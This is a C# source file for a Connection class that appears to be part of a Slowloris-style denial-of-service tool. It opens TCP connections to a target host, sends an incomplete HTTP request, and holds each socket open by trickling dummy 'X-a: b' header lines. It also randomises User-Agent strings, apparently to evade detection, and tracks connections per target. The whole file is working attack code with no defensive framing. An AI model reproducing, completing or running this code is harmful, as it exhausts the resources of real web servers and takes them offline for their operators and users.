using System.Net;
using System.Net.Sockets;
using System.Text;

internal class Connection : Socket
{
    private readonly TargetInfo _target;
    private readonly WaitHandle _signalHandle;

    private IThrottledStream? stream;

    public Connection(TargetInfo target, WaitHandle signalHandle)
        : base(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
    {
        _target = target;
        _signalHandle = signalHandle;
    }

    private async Task WriteAsync(string format, params object[] args)
    {
        byte[] buffer = Encoding.UTF8.GetBytes(string.Format(format, args));
        await stream!.WriteAsync(buffer);
    }

    private string GenerateRandomUserAgent()
    {
        const string FORMAT = "User-Agent: {0}\r\n";
        const string BROWSER_COMPATIBILITY_FORMAT = "(compatible; {0})";

        var browsersList = new string[] { "Mozilla", "AppleWebKit", "Chrome", "Safari", "Edge", "IExplorer" };
        var versionsList = new string[] { "5.0", "7.0", "5.1", "4.0", "537.36", "533.33", "99.90", "53.0.2785.143", "51.0.2785.143", "897.7.3214.331" };
        var compatibilityList = new string[] { "MSIE 7.0", "Windows NT 5.1", "Trident/4.0", ".NET CLR 1.1.4322", ".NET CLR 2.0.503l3", ".NET CLR 3.0.4506.2152", ".NET CLR 3.5.30729", "MSOffice 12" };

        var result = string.Empty; ;
        var browserAmount = new Random().Next(0, browsersList.Length);
        for (int i = 0; i < browserAmount; ++i)
        {
            int b = new Random().Next(0, browsersList.Length);
            int v = new Random().Next(0, versionsList.Length);
            result = $"{result} {browsersList[b]}/{versionsList[v]}";
        }

        var compatibilityAmount = new Random().Next(0, compatibilityList.Length);
        var compatibility = string.Empty;
        for (int i = 0; i < compatibilityAmount; ++i)
        {
            int c = new Random().Next(0, compatibilityList.Length);
            compatibility = $"{compatibility}; {compatibilityList[c]}";
        }

        result = $"{result} {string.Format(BROWSER_COMPATIBILITY_FORMAT, compatibility)}";
        return string.Format(FORMAT, result);
    }

    private async Task SendHeadersAsync()
    {
        const string FORMAT = "GET / HTTP/1.1\r\nHost: {0}\r\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, */*;q=0.8\r\nUser-Agent: {1}\r\nAccept-Encoding: deflate, gzip;q=1.0, *;q=0.5";
        await WriteAsync(FORMAT, _target.host, GenerateRandomUserAgent());
    }

    public async Task KeepAliveAsync()
    {
        const string FORMAT = "X-a: b\r\n";
        await WriteAsync(FORMAT);
    }

    public async Task ConnectAsync()
    {
        var addresses = await Dns.GetHostAddressesAsync(_target.host);
        foreach(var address in addresses)
        {
            await ConnectAsync(new IPEndPoint(address, _target.port));
            if (Connected) { break; }

            Close();
        }
        if (Connected)
        {
            stream = ThrottledStreamFactory.CreateStream(this, _target, _signalHandle);
            await SendHeadersAsync();
            Statistics.Instance.RecordConnected(_target.host);
        }
    }
}
